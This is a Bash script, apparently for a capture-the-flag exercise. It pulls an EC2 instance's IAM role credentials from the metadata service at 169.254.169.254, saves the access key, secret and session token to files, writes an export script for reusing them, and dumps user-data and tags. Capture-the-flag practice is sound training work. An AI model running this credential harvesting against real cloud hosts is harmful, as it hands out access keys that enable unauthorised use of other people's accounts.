#!/bin/bash
# Script para obter credenciais AWS do metadata service da EC2
# e buscar a chave do segundo módulo do CTF

echo "=========================================="
echo "Obtendo Credenciais AWS EC2"
echo "=========================================="
echo ""

# Metadata service URL
METADATA_BASE="http://169.254.169.254/latest/meta-data"
IAM_BASE="http://169.254.169.254/latest/meta-data/iam/security-credentials"

# Obter informações básicas
echo "[1] Informações da Instância EC2:"
echo "-----------------------------------"
INSTANCE_ID=$(curl -s "${METADATA_BASE}/instance-id" 2>/dev/null)
REGION=$(curl -s "${METADATA_BASE}/placement/region" 2>/dev/null)
PUBLIC_IP=$(curl -s "${METADATA_BASE}/public-ipv4" 2>/dev/null)
PRIVATE_IP=$(curl -s "${METADATA_BASE}/local-ipv4" 2>/dev/null)

echo "  Instance ID: ${INSTANCE_ID:-N/A}"
echo "  Region: ${REGION:-N/A}"
echo "  Public IP: ${PUBLIC_IP:-N/A}"
echo "  Private IP: ${PRIVATE_IP:-N/A}"
echo ""

# Obter IAM role
echo "[2] Obtendo IAM Role:"
echo "-----------------------------------"
IAM_ROLE=$(curl -s "${IAM_BASE}/" 2>/dev/null | head -1)
if [ -z "$IAM_ROLE" ]; then
    echo "  [!] Nenhum IAM role encontrado"
    echo "  [!] Tentando obter credenciais diretamente..."
    # Tentar listar todos os roles disponíveis
    curl -s "${IAM_BASE}/" 2>/dev/null
else
    echo "  IAM Role: $IAM_ROLE"
    echo ""
    
    # Obter credenciais temporárias
    echo "[3] Obtendo Credenciais Temporárias:"
    echo "-----------------------------------"
    CREDENTIALS=$(curl -s "${IAM_BASE}/${IAM_ROLE}" 2>/dev/null)
    
    if [ ! -z "$CREDENTIALS" ]; then
        echo "$CREDENTIALS" | python3 -m json.tool 2>/dev/null || echo "$CREDENTIALS"
        echo ""
        
        # Salvar credenciais em arquivo
        echo "[4] Salvando credenciais em arquivo..."
        echo "$CREDENTIALS" > aws_credentials.json
        echo "  Credenciais salvas em: aws_credentials.json"
        echo ""
        
        # Extrair valores individuais
        ACCESS_KEY=$(echo "$CREDENTIALS" | grep -o '"AccessKeyId"[[:space:]]*:[[:space:]]*"[^"]*"' | cut -d'"' -f4)
        SECRET_KEY=$(echo "$CREDENTIALS" | grep -o '"SecretAccessKey"[[:space:]]*:[[:space:]]*"[^"]*"' | cut -d'"' -f4)
        TOKEN=$(echo "$CREDENTIALS" | grep -o '"Token"[[:space:]]*:[[:space:]]*"[^"]*"' | cut -d'"' -f4)
        EXPIRATION=$(echo "$CREDENTIALS" | grep -o '"Expiration"[[:space:]]*:[[:space:]]*"[^"]*"' | cut -d'"' -f4)
        
        echo "[5] Credenciais Extraídas:"
        echo "-----------------------------------"
        echo "  AccessKeyId: ${ACCESS_KEY:0:20}..."
        echo "  SecretAccessKey: ${SECRET_KEY:0:20}..."
        echo "  Token: ${TOKEN:0:50}..."
        echo "  Expiration: $EXPIRATION"
        echo ""
        
        # Criar arquivo de variáveis de ambiente
        echo "[6] Criando arquivo de variáveis de ambiente..."
        cat > aws_env.sh << EOF
#!/bin/bash
export AWS_ACCESS_KEY_ID="${ACCESS_KEY}"
export AWS_SECRET_ACCESS_KEY="${SECRET_KEY}"
export AWS_SESSION_TOKEN="${TOKEN}"
export AWS_DEFAULT_REGION="${REGION:-us-east-1}"
EOF
        chmod +x aws_env.sh
        echo "  Variáveis de ambiente salvas em: aws_env.sh"
        echo "  Para usar: source aws_env.sh"
        echo ""
    else
        echo "  [!] Não foi possível obter credenciais"
    fi
fi

echo ""
echo "=========================================="
echo "Informações Adicionais do Metadata Service"
echo "=========================================="
echo ""

# Listar todos os endpoints disponíveis
echo "[7] Endpoints disponíveis no metadata service:"
echo "-----------------------------------"
curl -s "${METADATA_BASE}/" 2>/dev/null | head -20
echo ""

# Verificar se há user-data
echo "[8] User Data:"
echo "-----------------------------------"
USER_DATA=$(curl -s "${METADATA_BASE}/user-data" 2>/dev/null)
if [ ! -z "$USER_DATA" ]; then
    echo "$USER_DATA"
else
    echo "  Nenhum user-data encontrado"
fi
echo ""

# Verificar tags da instância
echo "[9] Tags da Instância:"
echo "-----------------------------------"
TAGS=$(curl -s "${METADATA_BASE}/tags/instance" 2>/dev/null)
if [ ! -z "$TAGS" ]; then
    for tag in $TAGS; do
        VALUE=$(curl -s "${METADATA_BASE}/tags/instance/${tag}" 2>/dev/null)
        echo "  $tag: $VALUE"
    done
else
    echo "  Nenhuma tag encontrada"
fi
echo ""

echo "=========================================="
echo "Concluído!"
echo "=========================================="
